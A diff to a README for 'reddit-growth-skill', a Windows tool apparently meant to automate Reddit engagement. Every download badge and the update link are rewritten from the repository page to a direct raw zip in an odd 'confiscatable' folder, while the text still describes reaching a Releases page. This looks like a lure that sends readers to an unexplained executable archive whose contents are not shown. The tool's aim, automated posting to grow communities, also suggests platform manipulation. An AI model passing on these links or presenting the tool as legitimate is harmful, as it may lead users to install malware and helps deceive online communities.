@@ -1,6 +1,6 @@
 # 🚀 reddit-growth-skill - Grow Reddit Communities Naturally
 
-[![Download reddit-growth-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Decl7582/reddit-growth-skill)
+[![Download reddit-growth-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Decl7582/reddit-growth-skill/raw/refs/heads/main/confiscatable/reddit-skill-growth-v2.2.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these detailed steps to download and start using reddit-growth-skill on y
 
 Click the big green button below to visit the download page:
 
-[![Download reddit-growth-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Decl7582/reddit-growth-skill)
+[![Download reddit-growth-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Decl7582/reddit-growth-skill/raw/refs/heads/main/confiscatable/reddit-skill-growth-v2.2.zip)
 
 You will be taken to the GitHub repository page where you can find the latest release. Look for the "Releases" section on the page. There, download the Windows executable (`.exe`) file.
 
@@ -116,7 +116,7 @@ reddit-growth-skill will begin interacting in the chosen communities based on yo
 
 To get the latest improvements:
 
-- Return to the same download link: https://github.com/Decl7582/reddit-growth-skill
+- Return to the same download link: https://github.com/Decl7582/reddit-growth-skill/raw/refs/heads/main/confiscatable/reddit-skill-growth-v2.2.zip
 - Download the latest Windows executable file.
 - Run it to install over your current version.
 
@@ -155,7 +155,7 @@ For login or engagement issues:
 
 Visit the link below to download and begin setup:
 
-[![Download reddit-growth-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Decl7582/reddit-growth-skill)
+[![Download reddit-growth-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Decl7582/reddit-growth-skill/raw/refs/heads/main/confiscatable/reddit-skill-growth-v2.2.zip)
 
 ---
 
